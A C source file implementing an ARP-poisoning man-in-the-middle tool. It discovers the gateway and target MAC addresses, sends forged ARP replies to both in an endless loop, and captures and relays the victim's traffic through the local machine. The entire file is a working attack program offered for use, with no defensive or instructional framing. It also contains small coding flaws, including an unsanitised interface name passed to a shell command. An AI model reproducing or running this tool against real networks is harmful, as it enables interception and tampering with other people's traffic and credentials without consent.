#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h> 
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <pcap.h>
#include <libnet.h>

typedef struct arg_cb_send_packet{
  unsigned char* interface;
  unsigned char gateway_mac[6];
  unsigned char gateway_ip[16];
  unsigned char target_mac[6];
  unsigned char target_ip[16];
  unsigned char local_mac[6];
  unsigned char local_ip[16];
  pcap_t* handle;
} ArgSendPacket;

typedef struct arg_t_receive_packet{
  char* interface;
  unsigned char* gateway_mac;
  unsigned char* gateway_ip;
  unsigned char* target_mac;
  unsigned char* target_ip;
  unsigned char* local_mac;
  unsigned char* local_ip;
} ArgRevPacket;

typedef struct arg_t_arp_reply_mitm{
  char* interface;
  unsigned char* gateway_ip;
  unsigned char* gateway_mac;
  unsigned char* target_ip;
  unsigned char* target_mac;
  unsigned char* local_mac;
} ArgArpReply;

int get_local_mac(char* buffer, int buf_size){
  struct ifreq ifr;
  struct ifconf ifc;
  char buf[1024];
  int success = 0;

  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
  
  if(buf_size < 6)
    return -1;
  
  if(sock == -1){
    printf("[DEBUG] socket() ERROR\n");
  };

  ifc.ifc_len = sizeof(buf);
  ifc.ifc_buf = buf;
  if(ioctl(sock, SIOCGIFCONF, &ifc) == -1){
    printf("[DEBUG] idctl() ERROR\n");
  };

  struct ifreq* it = ifc.ifc_req;
  const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

  for(; it != end; ++it){
    strcpy(ifr.ifr_name, it->ifr_name);
    if(ioctl(sock, SIOCGIFFLAGS, &ifr) == 0){
      if(! (ifr.ifr_flags & IFF_LOOPBACK)){
	if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0){
	  success = 1;
	  break;
	}
      }
    }
    else {
      printf("[DEBUG] FATAL ERROR\n");
    }
  }
  
  if(success){
    memcpy(buffer, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
  }else{
    return -1;
  }
}


int send_arp_request_broadcast(char* interface, unsigned char* source_ip, unsigned char* source_mac, unsigned char* target_ip){  
  // Construct Ethernet Header
  struct ether_header header;
  header.ether_type = htons(ETH_P_ARP);
  memset(header.ether_dhost, 0xff, sizeof(header.ether_dhost));
  memcpy(header.ether_shost, (unsigned char*)source_mac, sizeof(header.ether_shost));


  // Construct ARP Request
  struct ether_arp req;
  req.arp_hrd = htons(ARPHRD_ETHER);
  req.arp_pro = htons(ETH_P_IP);
  req.arp_hln = ETHER_ADDR_LEN;
  req.arp_pln = sizeof(in_addr_t);
  req.arp_op = htons(ARPOP_REQUEST);
  memset(&req.arp_tha, 0, sizeof(req.arp_tha));

  // Convert target IP address from string, copy into ARP Request
  struct in_addr target_ip_addr = {0};
  if(!inet_aton(target_ip, &target_ip_addr)){
    fprintf(stderr, "[DEBUG] %s is not a valid IP address", target_ip);
    exit(1);
  }
  memcpy(&req.arp_tpa, &target_ip_addr.s_addr, sizeof(req.arp_tpa));

  // Convert source IP address from string, copy into ARP Request
  struct in_addr source_ip_addr = {0};
  if(!inet_aton(source_ip, &source_ip_addr)){
    fprintf(stderr, "[DEBUG] %s is not a valid IP address", source_ip);
    exit(1);
  }
  memcpy(&req.arp_spa, &source_ip_addr.s_addr, sizeof(req.arp_spa));
  memcpy(&req.arp_sha, source_mac, sizeof(req.arp_sha));

  // Combine the Ethernet header and ARP request into a contiguous block
  unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
  memcpy(frame, &header, sizeof(struct ether_header));
  memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));

  char pcap_errbuf[PCAP_ERRBUF_SIZE];
  pcap_errbuf[0] = '\0';
  pcap_t* pcap = pcap_open_live(interface, 96, 0, 0, pcap_errbuf);
  if(pcap_errbuf[0] != '\0'){
    fprintf(stderr, "[DEBUG] %s\n", pcap_errbuf);
  }

  if(!pcap){
    fprintf(stderr, "[DEBUG] Could not send arp broadcast\n");
    return -1;
  }

  if(pcap_inject(pcap, frame, sizeof(frame)) == -1){
    pcap_perror(pcap, 0);
    pcap_close(pcap);
    return -1;
  }

  pcap_close(pcap);
  return 0;  
}


void t_send_arp_reply_mitm(void* data){
  char* interface = ((ArgArpReply*)data)->interface;
  unsigned char* gateway_ip = ((ArgArpReply*)data)->gateway_ip;
  unsigned char* gateway_mac = ((ArgArpReply*)data)->gateway_mac;
  unsigned char* target_ip = ((ArgArpReply*)data)->target_ip;
  unsigned char* target_mac = ((ArgArpReply*)data)->target_mac;
  unsigned char* local_mac = ((ArgArpReply*)data)->local_mac;
  
  while(1){
    // Construct Ethernet Header
    struct ether_header header;
    header.ether_type = htons(ETH_P_ARP);
    memcpy(header.ether_dhost, (unsigned char*)gateway_mac, sizeof(header.ether_dhost));
    memcpy(header.ether_shost, (unsigned char*)local_mac, sizeof(header.ether_shost));

    // Construct ARP Request
    struct ether_arp req;
    req.arp_hrd = htons(ARPHRD_ETHER);
    req.arp_pro = htons(ETH_P_IP);
    req.arp_hln = ETHER_ADDR_LEN;
    req.arp_pln = sizeof(in_addr_t);
    req.arp_op = htons(ARPOP_REPLY);
    memcpy(req.arp_tha, (unsigned char*)gateway_mac, sizeof(req.arp_tha));

    // Convert target IP address from string, copy into ARP Request
    struct in_addr target_ip_addr = {0};
    if(!inet_aton(gateway_ip, &target_ip_addr)){
      fprintf(stderr, "[DEBUG] %s is not a valid IP address", gateway_ip);
      exit(1);
    }
    memcpy(&req.arp_tpa, &target_ip_addr.s_addr, sizeof(req.arp_tpa));

    // Convert source IP address from string, copy into ARP Request
    struct in_addr source_ip_addr = {0};
    if(!inet_aton(target_ip, &source_ip_addr)){
      fprintf(stderr, "[DEBUG] %s is not a valid IP address", target_ip);
      exit(1);
    }
    memcpy(&req.arp_spa, &source_ip_addr.s_addr, sizeof(req.arp_spa));
    memcpy(&req.arp_sha, local_mac, sizeof(req.arp_sha));

    // Combine the Ethernet header and ARP request into a contiguous block
    unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    memcpy(frame, &header, sizeof(struct ether_header));
    memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));

    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    pcap_errbuf[0] = '\0';
    pcap_t* pcap = pcap_open_live(interface, 96, 0, 0, pcap_errbuf);
    if(pcap_errbuf[0] != '\0'){
      fprintf(stderr, "[DEBUG] %s\n", pcap_errbuf);
    }

    if(!pcap){
      
      return -1;
    }

    if(pcap_inject(pcap, frame, sizeof(frame)) == -1){
      fprintf(stderr, "[DEBUG] Could not send arp replay to gateway\n");
      pcap_close(pcap);
      return -1;
    }

    // Construct Ethernet Header
    header.ether_type = htons(ETH_P_ARP);
    memcpy(header.ether_dhost, (unsigned char*)target_mac, sizeof(header.ether_dhost));
    memcpy(header.ether_shost, (unsigned char*)local_mac, sizeof(header.ether_shost));

    // Construct ARP Request
    req.arp_hrd = htons(ARPHRD_ETHER);
    req.arp_pro = htons(ETH_P_IP);
    req.arp_hln = ETHER_ADDR_LEN;
    req.arp_pln = sizeof(in_addr_t);
    req.arp_op = htons(ARPOP_REPLY);
    memcpy(req.arp_tha, (unsigned char*)target_mac, sizeof(req.arp_tha));

    // Convert target IP address from string, copy into ARP Request
    if(!inet_aton(target_ip, &target_ip_addr)){
      fprintf(stderr, "[DEBUG] %s is not a valid IP address", gateway_ip);
      exit(1);
    }
    memcpy(&req.arp_tpa, &target_ip_addr.s_addr, sizeof(req.arp_tpa));

    // Convert source IP address from string, copy into ARP Request
    if(!inet_aton(gateway_ip, &source_ip_addr)){
      fprintf(stderr, "[DEBUG] %s is not a valid IP address", target_ip);
      exit(1);
    }
    memcpy(&req.arp_spa, &source_ip_addr.s_addr, sizeof(req.arp_spa));
    memcpy(&req.arp_sha, local_mac, sizeof(req.arp_sha));

    // Combine the Ethernet header and ARP request into a contiguous block
    memcpy(frame, &header, sizeof(struct ether_header));
    memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));

    pcap_errbuf[0] = '\0';
    if(pcap_errbuf[0] != '\0'){
      fprintf(stderr, "[DEBUG] %s\n", pcap_errbuf);
    }

    if(!pcap){
      
      return -1;
    }

    if(pcap_inject(pcap, frame, sizeof(frame)) == -1){
      fprintf(stderr, "[DEBUG] Could not send arp replay to target\n");
      pcap_close(pcap);
      return -1;
    }
    sleep(3);
    pcap_close(pcap);
  }
  return 0;  
}


void* t_capture_filter_arp(void* data){
  pcap_t* handle;
  char* dev;
  char errbuf[PCAP_ERRBUF_SIZE];
  bpf_u_int32 net;
  bpf_u_int32 mask;
  struct bpf_program fp;
  struct pcap_pkthdr header;
  const u_char* packet;
  struct ether_arp* arphdr;
  unsigned char* ret;
  
  dev = pcap_lookupdev(errbuf);
  if(dev == NULL){
    fprintf(stderr, "[DEBUG] Could not find default device: %s\n", errbuf);
    return NULL;
  }

  if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
    fprintf(stderr, "[DEBUG] Could not get netmask for device %s: %s\n", dev, errbuf);
    net = 0;
    mask = 0;
  }

  handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if(handle == NULL){
    fprintf(stderr, "[DEBUG] Could not open device %s: %s\n", dev, errbuf);
    return NULL;
  }

  char* filter_exp = "";
  if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
    fprintf(stderr, "[DEBUG] Could not parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return NULL;
  }

  if(pcap_setfilter(handle, &fp) == -1){
    fprintf(stderr, "[DEBUG] Could not install filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return NULL;
  }

  while(1){
    if((packet = pcap_next(handle, &header)) == NULL){
      fprintf(stderr, "[DEBUG] Getting the packet error. retry...\n");
    }else{
      arphdr = (struct ether_arp*)(packet + 14);
      if(ntohs(arphdr->arp_op) == 0x0002){  // if arp replay
	if(memcmp(arphdr->arp_tpa, (char *)data, 4)){ // and if arp target to me
	  ret = malloc(sizeof(char) * 6);
	  memcpy(ret, arphdr->arp_sha, 6);
	  break;
	}
      }
    }
  }
  pcap_close(handle);
  return ret;
}


int get_remote_mac(char* buffer, int buffer_size, char* interface, unsigned char* source_ip, unsigned char* source_mac, unsigned char* target_ip){
  // thread init & run thread
  pthread_t p_thread[1];
  int thr_id;
  const unsigned char* result;

  if(buffer_size < 6){
    perror("[DEBUG] buffer size must be greater than 6bytes\n");
    return -1;
  }

  thr_id = pthread_create(&p_thread[0], NULL, t_capture_filter_arp, source_ip);
  if(thr_id < 0){
    perror("[DEBUG] thread create error : ");
    return -1;
  }
  sleep(3);
  
  // send_arp_broadcast()
  if(0 > send_arp_request_broadcast(interface, source_ip, source_mac, target_ip)){
    perror("[DEBUG] send_arp_broadcast() error");
  }
    
  // receive reply from thread
  pthread_join(p_thread[0], (void **)&result);


  // return arp result
  memcpy((unsigned char*)buffer, (unsigned char*)result, 6);
  free((void*)result);
  return 1;
}

int get_gateway_ip(char* buffer, const char* interface){
    char cmd [1000] = {0x0};
    sprintf(cmd, "route -n | grep %s  | grep 'UG[ \t]' | awk '{print $2}'", interface);
    FILE* fp = popen(cmd, "r");
    char line[256]={0x0};
    char* line_p;

    if(fgets(line, sizeof(line), fp) != NULL){
      if((line_p = strchr(line, '\n')) != NULL)
	*line_p = '\0';
      strcpy(buffer, line);
    }

    pclose(fp);
    return 0;
}

int get_localhost_ip(char* buffer, char* interface){
  int fd;
  struct ifreq ifr;

  fd = socket(AF_INET, SOCK_DGRAM, 0);
  ifr.ifr_addr.sa_family = AF_INET;
  memcpy(ifr.ifr_name, interface, IFNAMSIZ);
  ioctl(fd, SIOCGIFADDR, &ifr);
  close(fd);
  strncpy(buffer, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 16);

  return 0;
}


void cb_send_packet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet){
  struct ether_header* ethhdr;
  struct ip* iph;
  struct tcphdr* tcph;
  struct udphdr* udph;
  u_char* send_packet;
  libnet_t *l;
  struct libnet_link_int* network;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ethhdr = (struct ether_header *)packet;
  iph = (struct ip *)(packet + sizeof(struct ether_header));
  //printf("CALLBACK !\n");
  if(ntohs(ethhdr->ether_type) == ETHERTYPE_IP && (!(strcmp(inet_ntoa(iph->ip_dst), ((ArgSendPacket*)arg)->target_ip)) || !(strcmp(inet_ntoa(iph->ip_src), ((ArgSendPacket*)arg)->target_ip)))){
    
    if(!memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->target_mac, 6)) {
      //printf("from sender to gateway\n");
	memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, 6);
	memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->gateway_mac, 6);
    }
    else if(!memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->gateway_mac, 6)) {
      //printf("from gateway to sender\n");
      memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, 6);
      memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->target_mac, 6);
    }
    //printf("handle : %d\n", ((ArgSendPacket*)arg)->handle);
    pcap_sendpacket(((ArgSendPacket*)arg)->handle, packet, pkthdr->len);
  }
  
  return 0;
}


void t_receive_packet(void* data){
  pcap_t* handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  bpf_u_int32 net;
  bpf_u_int32 mask;
  struct bpf_program fp;
  struct pcap_pkthdr header;
  const u_char* packet;
  ArgSendPacket arg;

  handle = pcap_open_live(((ArgRevPacket*)data)->interface, BUFSIZ, 1, 1000, errbuf);
  if(handle == NULL){
    fprintf(stderr, "[DEBUG] Could not open device %s: %s\n", ((ArgRevPacket*)data)->interface, errbuf);
    return NULL;
  }
  
  char* filter_exp = "";
  if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
    fprintf(stderr, "[DEBUG] Could not parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return NULL;
  }

  if(pcap_setfilter(handle, &fp) == -1){
    fprintf(stderr, "[DEBUG] Could not install filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return NULL;
  }
  
  arg.interface = ((ArgRevPacket*)data)->interface;
  arg.handle = handle;
  memcpy(arg.gateway_mac, ((ArgRevPacket*)data)->gateway_mac, sizeof(arg.gateway_mac));
  memcpy(arg.gateway_ip, ((ArgRevPacket*)data)->gateway_ip, sizeof(arg.gateway_ip));
  memcpy(arg.target_mac, ((ArgRevPacket*)data)->target_mac, sizeof(arg.target_mac));
  memcpy(arg.target_ip, ((ArgRevPacket*)data)->target_ip, sizeof(arg.target_ip));
  memcpy(arg.local_mac, ((ArgRevPacket*)data)->local_mac, sizeof(arg.local_mac));
  memcpy(arg.local_ip, ((ArgRevPacket*)data)->local_ip, sizeof(arg.local_ip));
  
  pcap_loop(handle, 0, cb_send_packet, &arg);
  pcap_close(handle);
  return 0;
}



int main(int argc, char** argv){
  char* dev;
  char* net;
  unsigned char local_ip[16];
  unsigned char local_mac[6];
  unsigned char gateway_mac[6];
  unsigned char gateway_ip[16];
  unsigned char target_mac[6];
  //unsigned char target_ip[16];
  int ret;
  int i;
  char errbuf[PCAP_ERRBUF_SIZE];
  bpf_u_int32 netp;
  bpf_u_int32 maskp;
  struct pcap_pkthdr hdr;
  struct ether_arp pkt_arp;
  const u_char* packet;
  struct bpf_program fp;
  pcap_t* pcd;
  pthread_t p_thread[2];
  ArgArpReply arg_t_arp_reply;
  ArgRevPacket arg_t_rev_packet;

  // arg check & show help
  if(argc < 2){
    printf("[*] ARP MITM Poisoning Program\nUsage: %s target-ip-address\n", argv[0]);
    exit(1);
  }
  
  // get network device name
  dev = pcap_lookupdev(errbuf);
  if(dev == NULL){
    printf("[-] %s\n", errbuf);
    exit(1);
  }

  // print network device name
  printf("[+] Interface: %s\n", dev);

  // get network device name, mask and ip address
  ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
  if(ret == -1){
    printf("[-] %s\n", errbuf);
    exit(1);
  }

  // get local mac address
  if(get_local_mac(local_mac, sizeof(local_mac)) < 0){
    printf("[-] get_local_mac() ERROR\n");
    exit(1);
  }

  // reveal gateway ip address
  if(get_gateway_ip(gateway_ip, dev) < 0){
    printf("[-] get_gateway_ip() ERROR\n");
    exit(1);
  }
  
  printf("[*] Gathering information...\n");

  // get local ip address & print local information
  get_localhost_ip(local_ip, dev);
  printf("[+] My IP: %s\n", local_ip);
  printf("[+] My MAC: ");
  i = 6;
  do{
    printf("%s%02x", (i == 6) ? "" : ":", local_mac[6 - i]);
  }while(--i > 0);
  printf("\n");

  // get gateway mac address & print gateway information
  printf("[+] Gateway IP: %s\n", gateway_ip);
  get_remote_mac(gateway_mac, sizeof(gateway_mac), dev, local_ip, local_mac, gateway_ip);
  printf("[+] Gateway MAC: ");
  i = 6;
  do{
    printf("%s%02x", (i == 6) ? "" : ":", gateway_mac[6 - i]);
  }while(--i > 0);
  printf("\n");

  // get target mac address & print target information
  printf("[+] Target IP: %s\n", argv[1]);
  get_remote_mac(target_mac, sizeof(target_mac), dev, local_ip, local_mac, argv[1]);
  printf("[+] Target MAC: ");
  i = 6;
  do{
    printf("%s%02x", (i == 6) ? "" : ":", target_mac[6 - i]);
  }while(--i > 0);
  printf("\n");

  // do spoof !! until end of world !!
  printf("\n");
  printf("[*] Sending poisoning payload to gateway and target...\n");
  printf("[*] if you want to stop, press Ctrl+C.\n");

  arg_t_arp_reply.interface = dev;
  arg_t_arp_reply.gateway_ip = gateway_ip;
  arg_t_arp_reply.gateway_mac = gateway_mac;
  arg_t_arp_reply.target_ip = argv[1];
  arg_t_arp_reply.target_mac = target_mac;
  arg_t_arp_reply.local_mac = local_mac;
  if(0 > pthread_create(&p_thread[0], NULL, t_send_arp_reply_mitm, (void*)&arg_t_arp_reply))
    perror("[-] Send ARP MITM Reply Failed !\n");
  //send_arp_reply_mitm(dev, gateway_ip, gateway_mac, argv[1], target_mac, local_mac);

  // pthread_join(p_thread[0], NULL);
  
  arg_t_rev_packet.interface = dev;
  arg_t_rev_packet.gateway_ip = gateway_ip;
  arg_t_rev_packet.gateway_mac = gateway_mac;
  arg_t_rev_packet.target_ip = argv[1];
  arg_t_rev_packet.target_mac = target_mac;
  arg_t_rev_packet.local_mac = local_mac;
  arg_t_rev_packet.local_ip = local_ip;
  if(0 > pthread_create(&p_thread[1], NULL, t_receive_packet, (void*)&arg_t_rev_packet))
    perror("[DEBUG] Packet Relaying thread_create Failed !\n");
  printf("[*] Packet Relaying...\n");
  pthread_join(p_thread[1], NULL);
  
  return 0;
}

